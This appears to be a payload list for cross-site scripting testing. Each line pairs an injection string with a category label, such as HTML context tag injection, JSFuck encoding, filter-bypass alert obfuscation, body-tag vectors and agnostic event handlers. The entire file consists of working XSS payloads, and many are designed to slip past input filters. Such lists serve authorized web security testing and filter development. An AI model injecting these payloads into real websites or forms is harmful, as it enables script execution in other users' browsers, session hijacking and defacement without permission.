%00alert(0)@XSS nullbyte
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()@XSS JSFUCK
"><svg onload=alert(1)//@XSS HTML Context Tag Injection
"onmouseover=alert(1)//@XSS HTML Context Inline Injection
"autofocus/onfocus=alert(1)//@XSS HTML Context Inline Injection
'-alert(1)-'@XSS Javascript Context Code Injection
\'-alert(1)//@XSS Javascript Context Code Injection(escaping the escape)
</script><svg onload=alert(1)>@XSS Javascript Context Tag Injection
<svg onload=alert`1`>@XSS Without Parenthesis
<svg onload=alert&#40;1&#41>@XSS Without Parenthesis
(alert)(1)@XSS Filter Bypass Alert Obfuscation
a=alert,a(1)@XSS Filter Bypass Alert Obfuscation
[1].find(alert)@XSS Filter Bypass Alert Obfuscation
top[/al/.source+/ert/.source](1)@XSS Filter Bypass Alert Obfuscation
al\u0065rt(1)@XSS Filter Bypass Alert Obfuscation
top[8680439..toString(30)](1)@XSS Filter Bypass Alert Obfuscation
<body onfocus=alert(1)>@XSS Body Tag
<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x@XSS Body Tag
<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><x id=x>#x@XSS Body Tag
<marquee loop=1 width=0 onfinish=alert(1)>@XSS Miscellaneous Vectors
<audio src onloadstart=alert(1)>@XSS Miscellaneous Vectors
<video onloadstart=alert(1)><source>@XSS Miscellaneous Vectors
<input autofocus onblur=alert(1)>@XSS Miscellaneous Vectors
<keygen autofocus onfocus=alert(1)>@XSS Miscellaneous Vectors
<menu id=x contextmenu=x onshow=alert(1)>@XSS Miscellaneous Vectors
<x contenteditable onblur=alert(1)>@XSS Agnostic Event Handlers
<x oncontextmenu=alert(1)>@XSS Agnostic Event Handlers
<x oncut=alert(1)>@XSS Agnostic Event Handlers
<x ondblclick=alert(1)>@XSS Agnostic Event Handlers
<x ondrag=alert(1)>@XSS Agnostic Event Handlers
<x contenteditable onkeypress=alert(1)>@XSS Agnostic Event Handlers
<x onmousedown=alert(1)>@XSS Agnostic Event Handlers
<x onmouseover=alert(1)>@XSS Agnostic Event Handlers
<x contenteditable onpaste=alert(1)>@XSS Agnostic Event Handlers
<script>alert(1)// @XSS Code ReuseInline Script
